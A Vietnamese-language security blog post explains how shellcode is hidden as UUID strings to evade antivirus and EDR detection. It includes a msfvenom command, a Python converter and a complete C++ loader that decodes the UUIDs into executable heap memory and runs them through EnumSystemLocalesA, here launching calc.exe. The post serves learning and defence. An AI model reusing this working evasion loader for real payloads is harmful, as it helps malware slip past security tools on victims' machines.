---
title: Shellcode via UUID
date: 2025-12-21
categories: [Techniques]
tags: [Reverse, Shellcode]
image: /assets/posts/Shellcode_via_UUID/shellcode_via_uuid.png
description: Thực thi Shellcode thông qua UUID
---

##  I. Tổng quan

**Shellcode Execution via UUID** là một kỹ thuật lẩn tránh (evasion technique) thay vì lưu trữ shellcode dưới dạng một mảng byte thô (raw bytes) dễ bị phát hiện bởi các phần mềm diệt virus (AV/EDR) thông qua chữ ký tĩnh (static signature), kỹ thuật này chuyển đổi mã nhị phân thành một danh sách các chuỗi UUID (Universally Unique Identifier).

## II. Phân tích
### 1. Cơ sở lý thuyết
UUID, hay GUID (Globally Unique Identifier) trong hệ sinh thái Microsoft, là một giá trị định danh 128-bit (16 byte), được sử dụng rộng rãi để định danh duy nhất các đối tượng, giao diện (COM interfaces), và bản ghi trong hệ thống phân tán.   

Một UUID tiêu chuẩn được biểu diễn dưới dạng chuỗi ký tự thập lục phân gồm 32 chữ số, chia thành 5 nhóm được ngăn cách bởi dấu gạch nối theo định dạng `8-4-4-4-12`. Ví dụ: 6850c031-6163-636c-5459-504092741551.

Cấu trúc GUID trong C/C++ trên Windows được định nghĩa [chi tiết ở đây](https://learn.microsoft.com/en-us/windows/win32/api/guiddef/ns-guiddef-guid) như sau: 
![image](/assets/posts/Shellcode_via_UUID/0.png)


### 2. Quản Lý Bộ Nhớ Heap Và Sự Khác Biệt Với VirtualAlloc
Trong khi **VirtualAlloc** cấp phát bộ nhớ trực tiếp từ hệ điều hành với độ mịn cấp trang (page-level granularity, thường là 4KB), các hàm quản lý Heap (**HeapCreate, HeapAlloc**) hoạt động ở tầng cao hơn, quản lý các khối nhớ nhỏ hơn bên trong các trang đã được cấp phát.

Kỹ thuật UUID thường sử dụng Heap vì:
* Khó giám sát hơn: Việc cấp phát và giải phóng Heap diễn ra thường xuyên trong mọi ứng dụng. Giám sát toàn bộ các lệnh gọi HeapAlloc sẽ tạo ra lượng log khổng lồ, gây quá tải cho hệ thống phân tích.   
* Tính linh hoạt: Heap cho phép ghi dữ liệu phân mảnh và quản lý kích thước động tốt hơn, phù hợp với việc nạp từng đoạn shellcode nhỏ thông qua quá trình chuyển đổi UUID.
* Ngoài ra nó sử dụng các hàm API hợp pháp như **UuidFromStringA** và **RpcStringFreeA** từ thư viện **Rpcrt4.lib** để giải mã, giúp hành vi trông "sạch" hơn.


### 3. Cơ chế hoạt động 
Quá trình này lợi dụng việc một UUID chuẩn có kích thước 128-bit, tương đương với 16 bytes dữ liệu. Mã độc sẽ chia nhỏ shellcode thành các khối 16-byte và chuyển đổi chúng thành chuỗi ký tự và Loader chuyển chuỗi ngược lại thành bytes vào bộ nhớ và thực thi:

![image](/assets/posts/Shellcode_via_UUID/1.png)

#### 3.1. UuidFromStringA

![image](/assets/posts/Shellcode_via_UUID/2.png)
* Tham số thứ nhất: Chuỗi UUID dạng văn bản
* Tham số thứ hai: Con trỏ đến vị trí bộ nhớ nơi sẽ ghi dữ liệu nhị phân
* Chức năng: Chuyển đổi chuỗi UUID thành biểu diễn nhị phân 16 byte​

Điểm lợi của hàm này là nó không phải là hàm "bình thường" để sao chép bộ nhớ (như memcpy hoặc WriteProcessMemory), do đó các công cụ bảo mật thường không giám sát nó.

```cpp
#include <stdio.h>
#include <rpc.h>
#pragma comment(lib, "Rpcrt4.lib")

int main() {
    UUID uuid;
    RPC_CSTR uuidString = (RPC_CSTR)"123e4567-e89b-12d3-a456-426655440000";

    RPC_STATUS status = UuidFromStringA(uuidString, &uuid);

    if(status == RPC_S_OK) {
        printf("UUID successfully converted.");
        printf("Data1: %u", uuid.Data1);
    } 
    else {
        printf("Failed to convert UUID. Error code: %d", status);
    }

    return 0;
}
// gcc 3_1.c -o 3_1 -lrpcrt4 
```

![image](/assets/posts/Shellcode_via_UUID/3.png)


#### 3.2. EnumSystemLocalesA

![image](/assets/posts/Shellcode_via_UUID/4.png)

* Tham số thứ nhất: Con trỏ callback function (thực tế là địa chỉ shellcode)
* Chức năng: Liệt kê tất cả các locale hệ thống và gọi hàm callback cho mỗi locale​
* Mục đích kỹ thuật: Làm cho shellcode được thực thi như một callback function bình thường.

Code dưới đây demo việc dùng hàm **EnumSystemLocalesA** liệt kê tất cả các locale có sẵn trong hệ thống Windows, thông qua callback:

```cpp
#include <windows.h>
#include <iostream>
// Callback function to process each locale
BOOL CALLBACK LocaleEnumProc(LPSTR lpLocaleString) {
   std::cout << "Locale: " << lpLocaleString << std::endl;
   return TRUE; // Continue enumeration
}
int main() {
   // Enumerate installed locales
   if (!EnumSystemLocalesA(LocaleEnumProc, LCID_INSTALLED)) {
       std::cerr << "Failed to enumerate locales. Error: " << GetLastError() << std::endl;
   }
   return 0;
}
// g++ 3_2.cpp -o 3_2 -lkernel32
```

![image](/assets/posts/Shellcode_via_UUID/5.png)


### 4. Demo

Phần này mình sẽ tạo 1 chương trình với mục tiêu là khởi chạy app Máy tính (`calc.exe`) trong window bằng việc áp dụng kỹ thuật **Shellcode UUID**.

B1: Chuẩn bị shellcode khởi chạy `calc.exe`.

Mình sẽ dùng msfvenom cho đơn giản để gen shellcode:
```
msfvenom -a x86 --platform windows -p windows/exec CMD=calc.exe \
-f raw -o calc.bin
```

  ![image](/assets/posts/Shellcode_via_UUID/6.png)

B2: convert shellcode sang chuỗi **UUID**:

```python
from uuid import UUID
import sys

if len(sys.argv) < 2:
    print(f"Usage: {sys.argv[0]} <shellcode_file>")
    sys.exit(1)

with open(sys.argv[1], "rb") as f:
    chunk = f.read(16)
    while chunk:
        if len(chunk) < 16:
            padding = 16 - len(chunk)
            # pad NOP để không phá shellcode
            chunk = chunk + (b"\x90" * padding)
        print(f"\"{UUID(bytes_le=chunk)}\",")
        chunk = f.read(16)
```
![image](/assets/posts/Shellcode_via_UUID/7.png)

B4: Gán chuỗi UUID vào file cpp:

```cpp
#include <Windows.h>
#include <Rpc.h>
#include <stdio.h>

#pragma comment(lib, "Rpcrt4.lib")

int main() {
    const char* uuids[] = {
        "0082e8fc-0000-8960-e531-c0648b50308b",
        "528b0c52-8b14-2872-0fb7-4a2631ffac3c",
        "2c027c61-c120-0dcf-01c7-e2f252578b52",
        "3c4a8b10-4c8b-7811-e348-01d1518b5920",
        "498bd301-e318-493a-8b34-8b01d631ffac",
        "010dcfc1-38c7-75e0-f603-7df83b7d2475",
        "588b58e4-0124-66d3-8b0c-4b8b581c01d3",
        "018b048b-89d0-2444-245b-5b61595a51ff",
        "5a5f5fe0-128b-8deb-5d6a-018d85b20000",
        "31685000-6f8b-ff87-d5bb-f0b5a25668a6",
        "ff9dbd95-3cd5-7c06-0a80-fbe07505bb47",
        "6a6f7213-5300-d5ff-6361-6c632e657865",
        "90909000-9090-9090-9090-909090909090"
    };

    HANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* mem = HeapAlloc(hHeap, 0, 13 * 16);

    DWORD_PTR p = (DWORD_PTR)mem;
    for (int i = 0; i < 13; i++) {
        UuidFromStringA((RPC_CSTR)uuids[i], (UUID*)p);
        p += 16;
    }
    printf("Executing shellcode...\n");
    EnumSystemLocalesA((LOCALE_ENUMPROCA)mem, 0);

    HeapFree(hHeap, 0, mem);
    HeapDestroy(hHeap);
    return 0;
}
```

B5: Build và run
![image](/assets/posts/Shellcode_via_UUID/8.png)

![demo](/assets/posts/Shellcode_via_UUID/demo.gif)

## III. Reference

<https://0xk4n3ki.github.io/posts/Malwy/>

<https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/>

<https://www.nccgroup.com/research-blog/rift-analysing-a-lazarus-shellcode-execution-method/>

<https://isc.sans.edu/diary/31752>

<https://blog.securehat.co.uk/process-injection/shellcode-execution-via-enumsystemlocala>

<https://www.joesecurity.org/reports/report-642c7ad7b1608f00ba6159250b41ef75.html>

<https://gist.github.com/ChoiSG/9806b5c4fe35aa24c42de87d3012d650>
